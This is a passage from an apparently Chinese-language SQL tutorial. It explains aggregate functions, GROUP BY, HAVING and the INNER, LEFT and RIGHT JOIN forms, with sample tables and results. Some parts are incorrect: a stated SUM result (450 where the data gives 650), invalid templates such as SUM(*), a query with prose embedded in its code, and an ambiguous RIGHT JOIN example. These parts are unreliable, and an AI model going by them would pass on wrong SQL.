class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <br><span class="hljs-keyword">FROM</span> Employees <br><span class="hljs-keyword">WHERE</span> department <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;HR&#x27;</span>;<br></code></pre></td></tr></table></figure><p>对于这个查询，结果将返回满足条件的行数：</p><table><thead><tr><th>COUNT(*)</th></tr></thead><tbody><tr><td>3</td></tr></tbody></table><p>这表示在 <code>Employees</code> 表中，有 3 位员工属于 HR 部门。</p><h6 id="2、SUM-计算某一列的合计值，该列必须为数值类型"><a href="#2、SUM-计算某一列的合计值，该列必须为数值类型" class="headerlink" title="2、SUM() 计算某一列的合计值，该列必须为数值类型"></a>2、SUM() 计算某一列的合计值，该列必须为数值类型</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">SUM</span>(<span class="hljs-operator">*</span>)  <span class="hljs-keyword">FROM</span> <span class="hljs-operator">&lt;</span>表名<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-operator">&lt;</span>条件表达式<span class="hljs-operator">&gt;</span>；<br><span class="hljs-built_in">SUM</span>() 是一个聚合函数，用于计算指定列的总和。<br><span class="hljs-operator">&lt;</span>列名<span class="hljs-operator">&gt;</span> 是你想要计算总和的列的名称<br></code></pre></td></tr></table></figure><p>假设有一个名为 <code>Sales</code> 的表，结构如下：</p><table><thead><tr><th>id</th><th>amount</th></tr></thead><tbody><tr><td>1</td><td>100</td></tr><tr><td>2</td><td>150</td></tr><tr><td>3</td><td>200</td></tr><tr><td>4</td><td>50</td></tr><tr><td>5</td><td>300</td></tr></tbody></table><p>如果你想计算所有销售记录的总金额，可以使用以下 SQL 语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">SUM</span>(amount) <br><span class="hljs-keyword">FROM</span> Sales;<br></code></pre></td></tr></table></figure><p>如果你只想计算金额大于 100 的销售记录的总金额，可以使用：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">SUM</span>(amount) <br><span class="hljs-keyword">FROM</span> Sales <br><span class="hljs-keyword">WHERE</span> amount <span class="hljs-operator">&gt;</span> <span class="hljs-number">100</span>;<br></code></pre></td></tr></table></figure><p>对于第一个查询，结果将是：</p><table><thead><tr><th>SUM(amount)</th></tr></thead><tbody><tr><td>800</td></tr></tbody></table><p>对于第二个查询，结果将是：</p><table><thead><tr><th>SUM(amount)</th></tr></thead><tbody><tr><td>450</td></tr></tbody></table><h6 id="3、AVG（）-计算某一列的平均值，该列必须为数值类型"><a href="#3、AVG（）-计算某一列的平均值，该列必须为数值类型" class="headerlink" title="3、AVG（） 计算某一列的平均值，该列必须为数值类型"></a>3、AVG（） 计算某一列的平均值，该列必须为数值类型</h6><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">AVG</span>(*)  <span class="hljs-keyword">FROM</span> &lt;表名&gt; <span class="hljs-keyword">WHERE</span> &lt;条件表达式&gt;；<br><span class="hljs-built_in">AVG</span>() 是一个聚合函数，用于计算指定列的平均值。<br>&lt;列名&gt; 是你想要计算平均值的列的名称。<br></code></pre></td></tr></table></figure><p>eg：</p><p>假设有一个名为 <code>Students</code> 的表，结构如下：</p><table><thead><tr><th>id</th><th>score</th></tr></thead><tbody><tr><td>1</td><td>85</td></tr><tr><td>2</td><td>90</td></tr><tr><td>3</td><td>75</td></tr><tr><td>4</td><td>95</td></tr><tr><td>5</td><td>80</td></tr></tbody></table><p>如果你想计算所有学生的平均分，可以使用以下 SQL 语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">AVG</span>(score) <br><span class="hljs-keyword">FROM</span> Students;<br></code></pre></td></tr></table></figure><p>如果你只想计算分数大于 80 的学生的平均分，可以使用：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">AVG</span>(score) <br><span class="hljs-keyword">FROM</span> Students <br><span class="hljs-keyword">WHERE</span> score <span class="hljs-operator">&gt;</span> <span class="hljs-number">80</span>;<br></code></pre></td></tr></table></figure><p>对于第一个查询，结果将是：</p><table><thead><tr><th>AVG(score)</th></tr></thead><tbody><tr><td>85</td></tr></tbody></table><p>对于第二个查询，结果将是：</p><table><thead><tr><th>AVG(score)</th></tr></thead><tbody><tr><td>90</td></tr></tbody></table><h6 id="4、MAX（）-计算某一列的最大值"><a href="#4、MAX（）-计算某一列的最大值" class="headerlink" title="4、MAX（） 计算某一列的最大值"></a>4、MAX（） 计算某一列的最大值</h6><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">MAX</span>(*)  <span class="hljs-keyword">FROM</span> &lt;表名&gt; <span class="hljs-keyword">WHERE</span> &lt;条件表达式&gt;；<br><span class="hljs-built_in">MAX</span>() 是一个聚合函数，用于找出指定列中的最大值。<br>&lt;列名&gt; 是你想要找出最大值的列的名称。<br></code></pre></td></tr></table></figure><p>假设有一个名为 <code>Products</code> 的表，结构如下：</p><table><thead><tr><th>id</th><th>price</th></tr></thead><tbody><tr><td>1</td><td>100</td></tr><tr><td>2</td><td>200</td></tr><tr><td>3</td><td>150</td></tr><tr><td>4</td><td>250</td></tr><tr><td>5</td><td>300</td></tr></tbody></table><p>如果你想找出所有产品的最高价格，可以使用以下 SQL 语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">MAX</span>(price) <br><span class="hljs-keyword">FROM</span> Products;<br></code></pre></td></tr></table></figure><p>如果你只想找出价格大于 150 的产品的最高价格，可以使用：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">MAX</span>(price) <br><span class="hljs-keyword">FROM</span> Products <br><span class="hljs-keyword">WHERE</span> price <span class="hljs-operator">&gt;</span> <span class="hljs-number">150</span>;<br></code></pre></td></tr></table></figure><p><strong>查询结果</strong></p><p>对于第一个查询，结果将是：</p><table><thead><tr><th>MAX(price)</th></tr></thead><tbody><tr><td>300</td></tr></tbody></table><p>对于第二个查询，结果将是：</p><table><thead><tr><th>MAX(price)</th></tr></thead><tbody><tr><td>300</td></tr></tbody></table><h6 id="5、MIN（）-计算某一列的最小值"><a href="#5、MIN（）-计算某一列的最小值" class="headerlink" title="5、MIN（） 计算某一列的最小值"></a>5、MIN（） 计算某一列的最小值</h6><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">MIN</span>(*)  <span class="hljs-keyword">FROM</span> &lt;表名&gt; <span class="hljs-keyword">WHERE</span> &lt;条件表达式&gt;；<br></code></pre></td></tr></table></figure><h6 id="6、GROUP-BY-语句用于结合聚合函数，根据一个或多个列对结果集进行分组"><a href="#6、GROUP-BY-语句用于结合聚合函数，根据一个或多个列对结果集进行分组" class="headerlink" title="6、GROUP BY 语句用于结合聚合函数，根据一个或多个列对结果集进行分组"></a>6、GROUP BY 语句用于结合聚合函数，根据一个或多个列对结果集进行分组</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column_name, aggregate_function(column_name)<br><span class="hljs-keyword">FROM</span> table_name<br><span class="hljs-keyword">WHERE</span> column_name operator <span class="hljs-keyword">value</span><br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> column_name;<br><br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> column_name: 用于将结果集分组，以便对每个组应用聚合函数<br></code></pre></td></tr></table></figure><p>eg:</p><p>假设有一个名为 <code>Sales</code> 的表，结构如下：</p><table><thead><tr><th>product_id</th><th>sales_amount</th></tr></thead><tbody><tr><td>1</td><td>100</td></tr><tr><td>2</td><td>200</td></tr><tr><td>1</td><td>150</td></tr><tr><td>2</td><td>300</td></tr><tr><td>3</td><td>400</td></tr></tbody></table><p>如果你想计算每个产品的总销售额，可以使用以下 SQL 语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> product_id, <span class="hljs-built_in">SUM</span>(sales_amount)<br><span class="hljs-keyword">FROM</span> Sales<br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> product_id;<br></code></pre></td></tr></table></figure><p>如果你想计算销售额大于 150 的产品的总销售额，可以这样写：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> product_id, <span class="hljs-built_in">SUM</span>(sales_amount)<br><span class="hljs-keyword">FROM</span> Sales<br><span class="hljs-keyword">WHERE</span> sales_amount <span class="hljs-operator">&gt;</span> <span class="hljs-number">150</span><br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> product_id;<br></code></pre></td></tr></table></figure><p>对于第一个查询，结果将是：</p><table><thead><tr><th>product_id</th><th>SUM(sales_amount)</th></tr></thead><tbody><tr><td>1</td><td>250</td></tr><tr><td>2</td><td>500</td></tr><tr><td>3</td><td>400</td></tr></tbody></table><h6 id="7、HAVING-子句可以让我们筛选分组后的各组数据。"><a href="#7、HAVING-子句可以让我们筛选分组后的各组数据。" class="headerlink" title="7、HAVING 子句可以让我们筛选分组后的各组数据。"></a>7、HAVING 子句可以让我们筛选分组后的各组数据。</h6><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">column_name</span>, aggregate_function(<span class="hljs-built_in">column_name</span>)<br><span class="hljs-keyword">FROM</span> <span class="hljs-built_in">table_name</span><br><span class="hljs-keyword">WHERE</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">operator</span> <span class="hljs-keyword">value</span><br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> <span class="hljs-built_in">column_name</span><br><span class="hljs-keyword">HAVING</span> aggregate_function(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">operator</span> <span class="hljs-keyword">value</span>;<br><span class="hljs-keyword">HAVING</span> 子句用于对聚合后的结果进行过滤。只有满足该条件的分组才会出现在最终结果中。<br>这里的 aggregate_function(<span class="hljs-built_in">column_name</span>) 是你在 <span class="hljs-keyword">SELECT</span> 中使用的聚合函数，<span class="hljs-keyword">operator</span> 是同样的比较运算符，<span class="hljs-keyword">value</span> 是比较的值。<br></code></pre></td></tr></table></figure><p>假设有一个名为 <code>Sales</code> 的表，结构如下：</p><table><thead><tr><th>product_id</th><th>sales_amount</th></tr></thead><tbody><tr><td>1</td><td>100</td></tr><tr><td>2</td><td>200</td></tr><tr><td>1</td><td>150</td></tr><tr><td>2</td><td>300</td></tr><tr><td>3</td><td>400</td></tr></tbody></table><p>如果你想计算每个产品的总销售额，并仅返回总销售额大于 300 的产品，可以使用以下 SQL 语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> product_id, <span class="hljs-built_in">SUM</span>(sales_amount) <span class="hljs-keyword">AS</span> total_sales  <br><span class="hljs-built_in">SUM</span>(sales_amount) 计算每个产品的销售总额。<span class="hljs-keyword">AS</span> total_sales 将这个计算结果的列命名为 total_sales<br><span class="hljs-keyword">FROM</span> Sales<br><span class="hljs-keyword">WHERE</span> sales_amount <span class="hljs-operator">&gt;</span> <span class="hljs-number">100</span><br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> product_id<br><span class="hljs-keyword">HAVING</span> <span class="hljs-built_in">SUM</span>(sales_amount) <span class="hljs-operator">&gt;</span> <span class="hljs-number">300</span>;<br></code></pre></td></tr></table></figure><ol><li><strong>WHERE sales_amount &gt; 100</strong>:<ul><li>过滤掉销售额不大于 100 的记录。</li></ul></li><li><strong>GROUP BY product_id</strong>:<ul><li>按 <code>product_id</code> 进行分组。</li></ul></li><li><strong>SELECT product_id, SUM(sales_amount)</strong>:<ul><li>计算每个产品组的总销售额。</li></ul></li><li><strong>HAVING SUM(sales_amount) &gt; 300</strong>:<ul><li>在聚合结果中，只返回总销售额大于 300 的产品。</li></ul></li></ol><p>对于上述示例，结果可能如下：</p><table><thead><tr><th>product_id</th><th>total_sales</th></tr></thead><tbody><tr><td>2</td><td>500</td></tr><tr><td>3</td><td>400</td></tr></tbody></table><h5 id="（8）多表查询（笛卡尔查询）-使用-JOIN（外连接（左，右），内连接）"><a href="#（8）多表查询（笛卡尔查询）-使用-JOIN（外连接（左，右），内连接）" class="headerlink" title="（8）多表查询（笛卡尔查询） 使用 JOIN（外连接（左，右），内连接）"></a>（8）多表查询（笛卡尔查询） 使用 JOIN（外连接（左，右），内连接）</h5><p>左连接与右连接的左右指的是以两张表中的哪一张为基准，它们都是外连接。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SELECT</span> * FROM &lt;表<span class="hljs-number">1</span>&gt; &lt;表<span class="hljs-number">2</span>&gt;；<br></code></pre></td></tr></table></figure><p>如果表1和表2之间有关系，比如通过某个键（如 <code>id</code>），你可以使用 <code>JOIN</code> 来查询它们的组合：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SELECT</span> *<br><span class="hljs-attribute">FROM</span> 表<span class="hljs-number">1</span><br><span class="hljs-attribute">JOIN</span> 表<span class="hljs-number">2</span> <span class="hljs-literal">ON</span> 表<span class="hljs-number">1</span>.id = 表<span class="hljs-number">2</span>.foreign_id;<br></code></pre></td></tr></table></figure><p>这里，<code>表1.id</code> 是表1中的主键，<code>表2.foreign_id</code> 是表2中对应的外键。</p><p>eg:</p><p>假设我们有两个表：</p><p>用户表 (<code>users</code>):</p><table><thead><tr><th>id</th><th>name</th></tr></thead><tbody><tr><td>1</td><td>Alice</td></tr><tr><td>2</td><td>Bob</td></tr><tr><td>3</td><td>Carol</td></tr></tbody></table><p>订单表 (<code>orders</code>):</p><table><thead><tr><th>order_id</th><th>user_id</th><th>product</th></tr></thead><tbody><tr><td>101</td><td>1</td><td>Laptop</td></tr><tr><td>102</td><td>1</td><td>Mouse</td></tr><tr><td>103</td><td>2</td><td>Keyboard</td></tr><tr><td>104</td><td>3</td><td>Monitor</td></tr><tr><td>105</td><td>4</td><td>Printer</td></tr></tbody></table><p>我们希望查询每个用户的订单信息，可以使用以下 SQL 查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span><br><span class="hljs-keyword">FROM</span> users<br><span class="hljs-keyword">JOIN</span> orders <span class="hljs-keyword">ON</span> users.id <span class="hljs-operator">=</span> orders.user_id;<br></code></pre></td></tr></table></figure><ul><li><strong><code>SELECT \*</code></strong>: 我们选择所有列，包括 <code>users</code> 表和 <code>orders</code> 表的所有字段。</li><li><strong><code>FROM users</code></strong>: 从 <code>users</code> 表开始查询。</li><li><strong><code>JOIN orders ON users.id = orders.user_id</code></strong>: 将 <code>users</code> 表和 <code>orders</code> 表联接，条件是 <code>users</code> 表的 <code>id</code> 与 <code>orders</code> 表的 <code>user_id</code> 匹配。</li></ul><p>执行这个查询后，我们会得到以下结果：</p><table><thead><tr><th>id</th><th>name</th><th>order_id</th><th>user_id</th><th>product</th></tr></thead><tbody><tr><td>1</td><td>Alice</td><td>101</td><td>1</td><td>Laptop</td></tr><tr><td>1</td><td>Alice</td><td>102</td><td>1</td><td>Mouse</td></tr><tr><td>2</td><td>Bob</td><td>103</td><td>2</td><td>Keyboard</td></tr><tr><td>3</td><td>Carol</td><td>104</td><td>3</td><td>Monitor</td></tr></tbody></table><p><strong>SQL INNER JOIN</strong> </p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> column_name(s) <br><span class="hljs-keyword">FROM</span> table1 <br><span class="hljs-keyword">INNER</span> <span class="hljs-keyword">JOIN</span> table2 <br><span class="hljs-keyword">ON</span> table1.column_name=table2.column_name;<br>或者<br><span class="hljs-keyword">SELECT</span> column_name(s)<br><span class="hljs-keyword">FROM</span> table1<br><span class="hljs-keyword">JOIN</span> table2<br><span class="hljs-keyword">ON</span> table1.column_name=table2.column_name;<br><br>参数说明：<br><span class="hljs-keyword">SELECT</span> column_name(s):<br>   这部分指定你希望从查询中选择的列。可以是一个或多个列名，例如table1.column1, table2.column2。如果你想选择所有列，可以用 * 替代列名，比如 <span class="hljs-keyword">SELECT</span> *。<br><span class="hljs-keyword">FROM</span> table1:<br>   指定主查询的数据源，这里是 table1。该表是查询的基础。<br><span class="hljs-keyword">INNER</span> <span class="hljs-keyword">JOIN</span> table2:<br>    这里使用了 <span class="hljs-keyword">INNER</span> <span class="hljs-keyword">JOIN</span>，表示只返回在两个表中都有的匹配记录。换句话说，只有那些在 table1 和 table2 中都存在的行才会出现在结果中。<br><span class="hljs-keyword">ON</span> table1.column_name = table2.column_name:<br>    这部分定义了连接条件，即两个表之间的关系。table1.column_name 和 table2.column_name 是用于匹配的列名。只有当这两个列的值相等时，相关的记录才会被返回。<br><br></code></pre></td></tr></table></figure><p>eg：</p><p>两个表中，<strong>主键</strong>和<strong>外键</strong>的定义如下：</p><ol><li><ul><li><pre><code class="hljs">employees表： 主键     id 唯一标识每一行员工记录，确保没有重复。 外键     department_id     - 指向 **`departments` 表** 的 `id` 列，表示员工所属的部门。2. departments表：   - 主键     id 唯一标识每一个部门记录。   - 外键：   无 - 该表不包含指向其他表的外键<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"><br>假设有两个表：employees 表：<br><br>|<span class="hljs-string"> id   </span>|<span class="hljs-string"> name  </span>|<span class="hljs-string"> department_id </span>|<br>|<span class="hljs-string"> ---- </span>|<span class="hljs-string"> ----- </span>|<span class="hljs-string"> ------------- </span>|<br>|<span class="hljs-string"> 1    </span>|<span class="hljs-string"> Alice </span>|<span class="hljs-string"> 1             </span>|<br>|<span class="hljs-string"> 2    </span>|<span class="hljs-string"> Bob   </span>|<span class="hljs-string"> 2             </span>|<br>|<span class="hljs-string"> 3    </span>|<span class="hljs-string"> Carol </span>|<span class="hljs-string"> 1             </span>|<br><br>departments 表：<br><br>|<span class="hljs-string"> id   </span>|<span class="hljs-string"> department_name </span>|<br>|<span class="hljs-string"> ---- </span>|<span class="hljs-string"> --------------- </span>|<br>|<span class="hljs-string"> 1    </span>|<span class="hljs-string"> Sales           </span>|<br>|<span class="hljs-string"> 2    </span>|<span class="hljs-string"> HR              </span>|<br>|<span class="hljs-string"> 3    </span>|<span class="hljs-string"> IT              </span>|<br><br>执行以下查询：<br><br>```sql<br>SELECT employees.name, departments.department_name<br>FROM employees<br>INNER JOIN departments<br>ON employees.department_id = departments.id;<br></code></pre></td></tr></table></figure></code></pre></li></ul></li></ol><p>查询结果将返回所有在 <code>employees</code> 表和 <code>departments</code> 表中都有匹配记录的员工姓名和对应的部门名称：</p><table><thead><tr><th>name</th><th>department_name</th></tr></thead><tbody><tr><td>Alice</td><td>Sales</td></tr><tr><td>Bob</td><td>HR</td></tr><tr><td>Carol</td><td>Sales</td></tr></tbody></table><p> <strong>LEFT JOIN</strong></p><p><code>LEFT JOIN</code> 会返回左表（<code>table1</code>）中的所有行，即使在右表（<code>table2</code>）中没有匹配的行。如果右表中没有匹配项，结果中的右表字段将返回 <code>NULL</code>。 </p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> column_name(s)<br><span class="hljs-keyword">FROM</span> table1<br><span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> table2<br><span class="hljs-keyword">ON</span> table1.column_name = table2.column_name;<br>语句解析：<br><span class="hljs-keyword">SELECT</span> column_name(s):<br>   这里指定要查询的列。可以是 table1 和 table2 中的任意列，使用逗号分隔列名。<br><span class="hljs-keyword">FROM</span> table1:<br>   指定查询的主表是 table1。<br><br><span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> table2:<br>   使用 <span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> 连接 table1 和 table2。这意味着：<br>        查询将返回 table1 中的所有记录。<br>        对于 table1 中每一条记录，如果在 table2 中找到了匹配的记录，则也返回对应的记录；如果没有找到匹配的记录，则 table2 的相关列会返回 <span class="hljs-literal">NULL</span>。<br><br><span class="hljs-keyword">ON</span> table1.column_name = table2.column_name:<br>      指定连接条件，表示如何将两个表关联起来。这里 table1.column_name 是 table1 中的列，table2.column_name 是 table2 中的列。只有当这两列的值相等时，记录才会被视为匹配。<br><br></code></pre></td></tr></table></figure><p>eg：</p><p>employees 表：</p><table><thead><tr><th>id</th><th>name</th><th>department_id</th></tr></thead><tbody><tr><td>1</td><td>Alice</td><td>10</td></tr><tr><td>2</td><td>Bob</td><td>20</td></tr><tr><td>3</td><td>Charlie</td><td>NULL</td></tr></tbody></table><p>departments 表：</p><table><thead><tr><th>id</th><th>department_name</th></tr></thead><tbody><tr><td>10</td><td>HR</td></tr><tr><td>20</td><td>IT</td></tr><tr><td>30</td><td>Marketing</td></tr></tbody></table><p>语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> employees.name, departments.department_name<br><span class="hljs-keyword">FROM</span> employees<br><span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> departments<br><span class="hljs-keyword">ON</span> employees.department_id <span class="hljs-operator">=</span> departments.id;<br></code></pre></td></tr></table></figure><p>结果：</p><table><thead><tr><th>name</th><th>department_name</th></tr></thead><tbody><tr><td>Alice</td><td>HR</td></tr><tr><td>Bob</td><td>IT</td></tr><tr><td>Charlie</td><td>NULL</td></tr></tbody></table><p><strong>RIGHT JOIN</strong> </p><p><code>RIGHT JOIN</code>：此操作符用于从右侧表（在这个例子中是 <code>table2</code>）中选择所有的记录，同时根据连接条件匹配左侧表（<code>table1</code>）中的记录。如果左侧表中没有与右侧表匹配的记录，结果中仍会包含右侧表的记录，左侧表的字段将返回 <code>NULL</code>。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column_name(s)<br><span class="hljs-keyword">FROM</span> table1<br><span class="hljs-keyword">RIGHT</span> <span class="hljs-keyword">JOIN</span> table2<br><span class="hljs-keyword">ON</span> table1.column_name<span class="hljs-operator">=</span>table2.column_name;<br>或：<br><span class="hljs-keyword">SELECT</span> column_name(s)<br><span class="hljs-keyword">FROM</span> table1<br><span class="hljs-keyword">RIGHT</span> <span class="hljs-keyword">OUTER</span> <span class="hljs-keyword">JOIN</span> table2<br><span class="hljs-keyword">ON</span> table1.column_name<span class="hljs-operator">=</span>table2.column_name;<br><br>    <span class="hljs-keyword">SELECT</span> column_name(s)：指定要查询的列，可以是一个或多个列。<br>    <span class="hljs-keyword">FROM</span> table1：指定左侧的表。<br>    <span class="hljs-keyword">RIGHT</span> <span class="hljs-keyword">JOIN</span> table2：指定右侧的表，表中的所有记录都会被返回。<br>    <span class="hljs-keyword">ON</span> table1.column_name <span class="hljs-operator">=</span> table2.column_name：这是连接条件，用于指定如何匹配两个表的记录。<br><br></code></pre></td></tr></table></figure><p>假设我们有两个表：</p><p>table1(包含员工信息）：</p><table><thead><tr><th>employee_id</th><th>name</th></tr></thead><tbody><tr><td>1</td><td>Alice</td></tr><tr><td>2</td><td>Bob</td></tr></tbody></table><p>table2（包含部门信息）：</p><table><thead><tr><th>department_id</th><th>employee_id</th></tr></thead><tbody><tr><td>101</td><td>1</td></tr><tr><td>102</td><td>3</td></tr></tbody></table><p>执行查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> employee_id, name, department_id<br><span class="hljs-keyword">FROM</span> table1<br><span class="hljs-keyword">RIGHT</span> <span class="hljs-keyword">JOIN</span> table2<br><span class="hljs-keyword">ON</span> table1.employee_id <span class="hljs-operator">=</span> table2.employee_id;<br></code></pre></td></tr></table></figure><p>结果</p><table><thead><tr><th>employee_id</th><th>name</th><th>department_id</th></tr></thead><tbody><tr><td>1</td><td>Alice</td><td>101</td></tr><tr><td>3</td><td>NULL</td><td>102</td></tr></tbody></table><ul><li>第一个结果来自 <code>table1</code>，有与 <code>table2</code> 中的记录相匹配的员工（Alice）。</li><li>第二个结果来自 <code>table2</code>，但没有与 <code>table1</code> 中的员工匹配（employee_id &#x3D; 3），因此   <code>name</code> 列返回 <code>NULL</code>。</li></ul><p>两个对比：</p><p>table1员工信息）：</p><table><thead><tr><th>employee_id</th><th>name</th></tr></thead><tbody><tr><td>1</td><td>Alice</td></tr><tr><td>2</td><td>Bob</td></tr></tbody></table><p>table2（部门信息）：</p><table><thead><tr><th>department_id</th><th>employee_id</th></tr></thead><tbody><tr><td>101</td><td>1</td></tr><tr><td>102</td><td>3</td></tr></tbody></table><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> table2.department_id, table1.employee_id, table1.name<br><span class="hljs-keyword">FROM</span> table2<br><span class="hljs-keyword">RIGHT</span> <span class="hljs-keyword">JOIN</span> table1<br><span class="hljs-keyword">ON</span> table1.employee_id <span class="hljs-operator">=</span> 